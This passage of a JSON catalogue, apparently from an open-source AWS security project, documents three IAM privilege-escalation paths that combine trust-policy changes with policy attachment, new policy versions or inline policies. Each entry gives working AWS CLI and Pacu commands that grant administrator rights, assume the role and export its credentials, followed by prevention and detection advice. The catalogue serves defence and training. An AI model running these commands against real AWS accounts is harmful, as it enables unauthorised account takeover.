    "description": "A principal with `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by modifying an existing IAM role. The attacker first uses `iam:AttachRolePolicy` to attach an administrative managed policy to a target role, then uses `iam:UpdateAssumeRolePolicy` to modify the role's trust policy to allow the attacker to assume it. Once the trust policy is updated, the attacker can assume the role using `sts:AssumeRole` to gain the elevated privileges. A key aspect of this attack is that the attacker does not need pre-existing `sts:AssumeRole` permission - being explicitly named in the trust policy grants the ability to assume the role from AWS's perspective, as trust policies grant permission from the role's side rather than requiring it on the principal's side.",
    "prerequisites": {
      "admin": [
        "An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on",
        "An administrative managed policy must exist in the account to attach (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on",
        "A managed policy with elevated permissions must exist in the account to attach"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Set the target role and policy ARNs\nTARGET_ROLE=\"target-role-name\"\nADMIN_POLICY_ARN=\"arn:aws:iam::aws:policy/AdministratorAccess\"\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\n",
          "description": "Define the target role to compromise and the administrative policy to attach"
        },
        {
          "step": 2,
          "command": "# Attach the administrative policy to the target role\naws iam attach-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-arn $ADMIN_POLICY_ARN\n",
          "description": "Attach an administrative managed policy (AdministratorAccess) to the target role using iam:AttachRolePolicy"
        },
        {
          "step": 3,
          "command": "# Wait for policy attachment to propagate\nsleep 15\n",
          "description": "Wait for the policy attachment to propagate across AWS infrastructure (recommended 15 seconds)"
        },
        {
          "step": 4,
          "command": "# Verify the policy was attached\naws iam list-attached-role-policies --role-name $TARGET_ROLE\n",
          "description": "Verify that the AdministratorAccess policy is now attached to the target role"
        },
        {
          "step": 5,
          "command": "# Get the current principal ARN\nPRINCIPAL_ARN=$(aws sts get-caller-identity --query Arn --output text)\n\n# Create a new trust policy that includes the attacker\ncat > trust-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"$PRINCIPAL_ARN\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a new trust policy document that explicitly allows the attacker to assume the role"
        },
        {
          "step": 6,
          "command": "# Update the role's trust policy\naws iam update-assume-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-document file://trust-policy.json\n",
          "description": "Update the target role's trust policy using iam:UpdateAssumeRolePolicy to allow the attacker to assume it"
        },
        {
          "step": 7,
          "command": "# Wait for trust policy update to propagate\nsleep 15\n",
          "description": "Wait for the trust policy update to propagate across AWS infrastructure (recommended 15 seconds)"
        },
        {
          "step": 8,
          "command": "# Verify the trust policy was updated\naws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument'\n",
          "description": "Verify that the trust policy now includes the attacker as a trusted principal"
        },
        {
          "step": 9,
          "command": "# Assume the role (note: no prior sts:AssumeRole permission needed)\nROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}\"\n\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn $ROLE_ARN \\\n  --role-session-name privesc-session \\\n  --output json)\n\n# Extract temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')\n",
          "description": "Assume the role to obtain temporary credentials with administrative privileges. Trust policy grants permission to assume the role, so no prior sts:AssumeRole permission is required on the principal."
        },
        {
          "step": 10,
          "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
          "description": "Verify that you now have administrative access using the assumed role credentials"
        }
      ]
    },
    "limitations": "This attack path provides administrative access only if an administrative managed policy (e.g., AdministratorAccess) exists in the AWS account to attach. If only limited managed policies are available, the attacker gains access limited to those permissions. However, even limited privilege escalation may enable multi-hop attacks or access to sensitive data.\n\nUnlike inline policy-based attacks (such as iam:PutRolePolicy), this attack requires choosing from existing managed policies in the environment. The attacker cannot create arbitrary permissions - they can only attach policies that already exist as managed policies (either AWS-managed or customer-managed).\n\nThe attack requires that the starting principal has both permissions (`iam:AttachRolePolicy` AND `iam:UpdateAssumeRolePolicy`) scoped to the same target role. If these permissions are scoped to different roles, the attack path is not viable without additional permissions.\n\nAdditionally, the attacker does not need pre-existing `sts:AssumeRole` permission. When a principal is explicitly named in a role's trust policy, AWS grants the ability to assume that role from the trust policy's authorization, not from the principal's permissions. This is a fundamental AWS IAM behavior that is often overlooked in security assessments.\n",
    "recommendation": "Restrict `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions should rarely be granted together on the same target role, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Restrict `iam:AttachRolePolicy` to limit which policies can be attached and to which roles:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AttachRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"ArnEquals\": {\n      \"iam:PolicyArn\": [\n        \"arn:aws:iam::ACCOUNT:policy/AllowedPolicy1\",\n        \"arn:aws:iam::ACCOUNT:policy/AllowedPolicy2\"\n      ]\n    }\n  }\n}\n```\n\n2. Restrict `iam:UpdateAssumeRolePolicy` to prevent arbitrary trust policy modifications:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:UpdateAssumeRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:RequestedRegion\": \"us-east-1\"\n    }\n  }\n}\n```\n\n3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if administrative policies are attached\n\n4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` to the same principal for the same target role\n\n5. Require MFA for sensitive role policy attachment and trust policy modification operations\n\n6. Use AWS Config rules to detect and alert on role policy attachments and trust policy changes\n\n7. Use Service Control Policies (SCPs) to prevent the attachment of overly permissive managed policies or to restrict trust policy modifications\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `AttachRolePolicy` API calls, especially when attaching AWS-managed admin policies like AdministratorAccess\n- `UpdateAssumeRolePolicy` API calls that add new principals to role trust policies\n- Sequential occurrences of `AttachRolePolicy` followed by `UpdateAssumeRolePolicy` on the same role within a short time window\n- `AssumeRole` API calls immediately following trust policy updates\n- `UpdateAssumeRolePolicy` events where new principals are added to the trust policy\n\nSet up CloudWatch alarms for unexpected changes to role policies and trust policies. Investigate any role policy attachments combined with trust policy modifications. Consider implementing automated responses to roll back suspicious policy changes or to quarantine affected roles.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-attachrolepolicy+iam-updateassumerolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachRolePolicy and IAM-UpdatingAssumeRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths (two separate scenarios: privesc9 and privesc14)"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamattachrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:AttachRolePolicy and iam:UpdateAssumeRolePolicy permissions on a target role. Can be an IAM user or role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "An existing IAM role that will be modified. The attacker will attach an administrative policy to it and update its trust policy to allow assumption.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If an administrative managed policy (e.g., AdministratorAccess) is attached to the role, the attacker gains full administrative access after assuming the role.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If a managed policy with elevated but non-administrative permissions is attached, the attacker gains partial privilege escalation.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If only managed policies with minimal permissions are available to attach, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy & then sts:AssumeRole",
          "description": "The attacker first attaches an administrative managed policy (e.g., AdministratorAccess) to the target role, then updates the role's trust policy to allow their principal to assume it, and finally assumes the role. No prior sts:AssumeRole permission is needed - the trust policy grants this capability.\n\nCommands:\n```bash\n# Step 1: Attach administrative policy\naws iam attach-role-policy \\\n  --role-name target-role \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# Step 2: Update trust policy\naws iam update-assume-role-policy \\\n  --role-name target-role \\\n  --policy-document file://trust-policy.json\n\n# Step 3: Assume the role\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role \\\n  --role-session-name privesc-session\n```\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If administrative policy attached",
          "branch": "A",
          "condition": "admin",
          "description": "If AdministratorAccess or equivalent was attached to the role, the attacker gains full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If elevated policy attached",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If a policy with elevated but non-administrative permissions was attached, the attacker gains partial privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If limited policy attached",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If only limited managed policies were available to attach, the attacker may not gain meaningful additional access.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-10T13:36:26Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-019.yaml"
  },
  {
    "id": "iam-020",
    "name": "iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:CreatePolicyVersion",
          "resourceConstraints": "Must have access to create policy versions on a customer-managed policy attached to the target role"
        },
        {
          "permission": "iam:UpdateAssumeRolePolicy",
          "resourceConstraints": "Must have permission to update the trust policy of the target role"
        }
      ],
      "additional": [
        {
          "permission": "iam:GetPolicy",
          "resourceConstraints": "Helpful for retrieving policy details and ARNs"
        },
        {
          "permission": "iam:GetPolicyVersion",
          "resourceConstraints": "Useful for viewing current policy version contents"
        },
        {
          "permission": "iam:ListPolicyVersions",
          "resourceConstraints": "Helpful for viewing all versions of a policy"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to target"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached policies"
        }
      ]
    },
    "description": "This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to a different role (not your own principal). In this scenario, you cannot directly escalate your own privileges by modifying the policy, but you can escalate by modifying the policy attached to the target role and then assuming that role. This requires both `iam:CreatePolicyVersion` on the customer-managed policy AND `iam:UpdateAssumeRolePolicy` on the target role. You create a new policy version with administrative permissions (which automatically becomes the default), update the target role's trust policy to allow your principal to assume it, then assume the role to gain the elevated privileges. Critically, you do not need `sts:AssumeRole` permission beforehand - when a principal is explicitly named in a role's trust policy, AWS allows that principal to assume the role regardless of whether they have separate `sts:AssumeRole` permission.",
    "prerequisites": {
      "admin": [
        "A customer-managed IAM policy must exist that is attached to a target role",
        "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy",
        "You must have `iam:UpdateAssumeRolePolicy` permission on the target role",
        "The target role must have a customer-managed policy attached (not just AWS-managed policies, which cannot be modified)"
      ],
      "lateral": [
        "A customer-managed IAM policy must exist that is attached to a target role",
        "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy",
        "You must have `iam:UpdateAssumeRolePolicy` permission on the target role"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Set variables for the target policy and role\nPOLICY_ARN=\"arn:aws:iam::ACCOUNT_ID:policy/target-policy-name\"\nTARGET_ROLE=\"target-role-name\"\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\nSTARTING_PRINCIPAL_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)\n",
          "description": "Define the target policy ARN, role name, and retrieve your principal ARN for the trust policy update"
        },
        {
          "step": 2,
          "command": "# Create admin_policy.json with administrative permissions\ncat > admin_policy.json << 'EOF'\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a policy document with full administrative permissions"
        },
        {
          "step": 3,
          "command": "# Create a new policy version with admin permissions and set as default\naws iam create-policy-version \\\n  --policy-arn $POLICY_ARN \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n",
          "description": "Create a new policy version with administrative permissions. The --set-as-default flag makes this version active immediately, affecting all principals with this policy attached (including the target role)"
        },
        {
          "step": 4,
          "command": "# Wait for policy changes to propagate\nsleep 15\n",
          "description": "Wait for the IAM policy changes to propagate across AWS infrastructure (typically takes 10-15 seconds)"
        },
        {
          "step": 5,
          "command": "# Create a new trust policy that allows your principal to assume the role\ncat > trust_policy.json << EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"$STARTING_PRINCIPAL_ARN\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a trust policy that explicitly allows your principal to assume the target role"
        },
        {
          "step": 6,
          "command": "# Update the role's trust policy\naws iam update-assume-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-document file://trust_policy.json\n",
          "description": "Update the target role's trust policy to allow your principal to assume it"
        },
        {
          "step": 7,
          "command": "# Wait for trust policy changes to propagate\nsleep 15\n",
          "description": "Wait for the trust policy changes to propagate"
        },
        {
          "step": 8,
          "command": "# Assume the target role (no prior sts:AssumeRole permission needed)\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn \"arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE\" \\\n  --role-session-name privesc-session \\\n  --query 'Credentials' \\\n  --output json)\n\n# Export the temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n",
          "description": "Assume the target role to obtain temporary credentials with administrative permissions. Note that you do not need prior sts:AssumeRole permission - being explicitly named in the trust policy is sufficient"
        },
        {
          "step": 9,
          "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
          "description": "Verify that you now have administrative access by listing IAM users"
        }
      ]
    },
    "limitations": "This attack requires a customer-managed policy that is attached to a role. AWS-managed policies cannot be modified (no versions can be created), so this attack only works with customer-managed policies.\n\nAdditionally, the starting principal must have both permissions (`iam:CreatePolicyVersion` on the customer-managed policy AND `iam:UpdateAssumeRolePolicy` on the target role). If these permissions are scoped to different policies or roles, the attack path may not be viable.\n\nThe attack provides administrative access when you create a policy version with admin permissions. However, you could create a policy with any permissions, so the level of access depends on what you include in the new policy version.\n",
    "recommendation": "Restrict `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions are highly sensitive and should rarely be granted together.\n\n**Prevention strategies:**\n\n1. Limit `iam:CreatePolicyVersion` to only administrative users who need to manage policies:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreatePolicyVersion\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:policy/SpecificPolicy\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:RequestedRegion\": \"us-east-1\"\n    }\n  }\n}\n```\n\n2. Restrict `iam:UpdateAssumeRolePolicy` to prevent unauthorized trust policy modifications:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:UpdateAssumeRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringNotLike\": {\n      \"iam:PolicyDocument\": \"*arn:aws:iam::*:role/*\"\n    }\n  }\n}\n```\n\n3. Use Service Control Policies (SCPs) to prevent modification of critical policies and trust relationships across the organization\n\n4. Implement IAM permissions boundaries to limit the maximum permissions a role can have\n\n5. Separate the permissions - avoid granting both `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy` to the same principal\n\n6. Require MFA for policy version creation and trust policy modification operations\n\n7. Consider using AWS IAM Access Analyzer to continuously monitor trust policies for unexpected principals\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `CreatePolicyVersion` API calls, especially with the `--set-as-default` flag\n- `UpdateAssumeRolePolicy` API calls that add new principals to trust policies\n- Sequential occurrences of `CreatePolicyVersion` followed by `UpdateAssumeRolePolicy` within a short time window\n- `AssumeRole` events that follow policy or trust policy modification events\n- Creation of policy versions that grant overly broad permissions (e.g., `Action: \"*\"` or administrative managed policies)\n\nSet up CloudWatch alarms for unexpected changes to customer-managed policies and role trust policies. Investigate any modifications that broaden trust relationships or elevate permissions.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation Methods",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "Hacking The Cloud - IAM Privilege Escalation",
        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-002",
      "iam-009",
      "iam-014"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-createpolicyversion+iam-updateassumerolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "ruleId": "TBD",
        "url": "https://docs.datadoghq.com/security/default_rules/"
      }
    ],
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:CreatePolicyVersion and iam:UpdateAssumeRolePolicy permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "An IAM role with a customer-managed policy attached. The attacker will create a new version of that policy with administrative permissions and update the role's trust policy to allow assumption.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "After creating a policy version with administrative permissions and assuming the role, the attacker gains full administrative access.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the new policy version grants elevated but non-administrative permissions, the attacker gains partial privilege escalation after assuming the role.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the new policy version only grants minimal permissions, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy + sts:AssumeRole",
          "description": "The attacker first creates a new version of the customer-managed policy (attached to the target role) with administrative permissions, then updates the role's trust policy to allow their principal to assume it, and finally assumes the role. No prior sts:AssumeRole permission is needed - the trust policy grants this capability.\n\nCommands:\n```bash\n# Step 1: Create new policy version with admin permissions\naws iam create-policy-version \\\n  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/target-policy \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n\n# Step 2: Update trust policy\naws iam update-assume-role-policy \\\n  --role-name target-role \\\n  --policy-document file://trust_policy.json\n\n# Step 3: Assume the role\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role \\\n  --role-session-name privesc-session\n```\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If admin policy version created",
          "branch": "A",
          "condition": "admin",
          "description": "If the policy version grants administrative permissions, the attacker gains full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If elevated policy version created",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the policy version grants elevated but non-administrative permissions, the attacker gains partial privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If limited policy version created",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the policy version only grants minimal permissions, the attacker may not gain meaningful additional access.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-10T13:36:26Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-020.yaml"
  },
  {
    "id": "iam-021",
    "name": "iam:PutRolePolicy + iam:UpdateAssumeRolePolicy",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PutRolePolicy",
          "resourceConstraints": "Must have access to add inline policies to the target role"
        },
        {
          "permission": "iam:UpdateAssumeRolePolicy",
          "resourceConstraints": "Must have permission to modify the trust policy of the target role"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to target"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing current role trust policies and attached permissions"
        },
        {
          "permission": "iam:ListRolePolicies",
          "resourceConstraints": "Helpful for viewing current inline policies on the target role"
        },
        {
          "permission": "iam:GetRolePolicy",
          "resourceConstraints": "Useful for retrieving and examining the content of existing inline policies"
        }
      ]
    },
    "description": "A principal with `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by first adding an inline policy with administrative permissions to a target role, then modifying that role's trust policy to allow the attacker to assume it. The key insight is that when a principal is explicitly named in a role's trust policy, that principal can assume the role without needing separate `sts:AssumeRole` permissions - the trust policy itself grants this capability. This attack is often overlooked because each permission appears innocuous when evaluated separately: `iam:PutRolePolicy` seems like a reasonable permission for managing role permissions, and `iam:UpdateAssumeRolePolicy` seems reasonable for managing trust relationships. However, when combined, they create a complete privilege escalation path.",
    "prerequisites": {
      "admin": [
        "A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on"
      ],
      "lateral": [
        "A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Set the target role name\nTARGET_ROLE=\"target-role-name\"\n",
          "description": "Define the target role that will be modified and assumed"
        },
        {
          "step": 2,
          "command": "# Create an admin policy document\ncat > admin-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a policy document with administrative permissions (all actions on all resources)"
        },
        {
          "step": 3,
          "command": "# Add the admin inline policy to the target role\naws iam put-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-name AdminEscalation \\\n  --policy-document file://admin-policy.json\n",
          "description": "Add the administrative inline policy to the target role using iam:PutRolePolicy"
        },
        {
          "step": 4,
          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
          "description": "Wait for the inline policy to propagate across AWS infrastructure"
        },
        {
          "step": 5,
          "command": "# Get your current principal ARN\nCURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)\necho \"Current principal ARN: $CURRENT_ARN\"\n",
          "description": "Retrieve your current principal ARN to add to the trust policy"
        },
        {
          "step": 6,
          "command": "# Get the account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\n\n# Create a new trust policy that includes your principal\ncat > trust-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"$CURRENT_ARN\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a new trust policy document that explicitly allows your principal to assume the role"
        },
        {
          "step": 7,
          "command": "# Update the role's trust policy\naws iam update-assume-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-document file://trust-policy.json\n",
          "description": "Update the role's trust policy using iam:UpdateAssumeRolePolicy to allow your principal to assume it"
        },
        {
          "step": 8,
          "command": "# Wait for trust policy changes to propagate (15 seconds)\nsleep 15\n",
          "description": "Wait for the trust policy to propagate across AWS infrastructure"
        },
        {
          "step": 9,
          "command": "# Assume the role (no prior sts:AssumeRole permission needed)\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn \"arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE\" \\\n  --role-session-name privileged-session \\\n  --output json)\n\n# Extract the temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')\n",
          "description": "Assume the role using sts:AssumeRole. Note that no prior sts:AssumeRole permission is needed because the trust policy grants this capability automatically when a principal is explicitly named."
        },
        {
          "step": 10,
          "command": "# Verify administrative access using the assumed role credentials\naws iam list-users --max-items 5\n",
          "description": "Verify that you now have administrative access by listing IAM users with the assumed role credentials"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "# Use Pacu to add an admin inline policy to the target role\nrun iam__put_role_policy --role-name target-role-name --policy-name AdminEscalation --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n",
          "description": "Use Pacu to add an administrative inline policy to the target role"
        },
        {
          "step": 2,
          "command": "# Use Pacu to update the role's trust policy\nrun iam__update_assume_role_policy --role-name target-role-name --principal-arn YOUR_PRINCIPAL_ARN\n",
          "description": "Use Pacu to update the role's trust policy to allow your principal to assume it"
        },
        {
          "step": 3,
          "command": "# Use Pacu to assume the role\nrun sts__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role-name\n",
          "description": "Use Pacu to assume the role and obtain temporary credentials with administrative permissions"
        }
      ]
    },
    "limitations": "This attack provides administrative access because the attacker controls the inline policy document content. Unlike `iam:AttachRolePolicy` (which requires choosing from existing managed policies), `iam:PutRolePolicy` allows the attacker to embed any policy document directly into the role, guaranteeing administrative permissions regardless of what policies exist in the environment.\n\nThe attack requires that the starting principal has both permissions (`iam:PutRolePolicy` AND `iam:UpdateAssumeRolePolicy`) scoped to the same target role. If these permissions are scoped to different roles, the attack path is not viable without additional steps.\n\nA critical aspect of this attack is that named principals in trust policies can assume roles WITHOUT needing explicit `sts:AssumeRole` permissions on their own policies. When you add your principal ARN to a role's trust policy, the trust policy itself grants you the ability to assume that role. This is often misunderstood and leads to the false belief that `iam:UpdateAssumeRolePolicy` alone cannot lead to privilege escalation.\n\nThe attack leaves clear audit trails in CloudTrail (PutRolePolicy and UpdateAssumeRolePolicy events), but it can be executed quickly (within 30-45 seconds including propagation delays).\n\nInline policies can be harder to detect in security reviews because they are embedded in the role object rather than referenced as separate policy entities. Some IAM policy management tools may not highlight inline policies as prominently as managed policy attachments.\n",
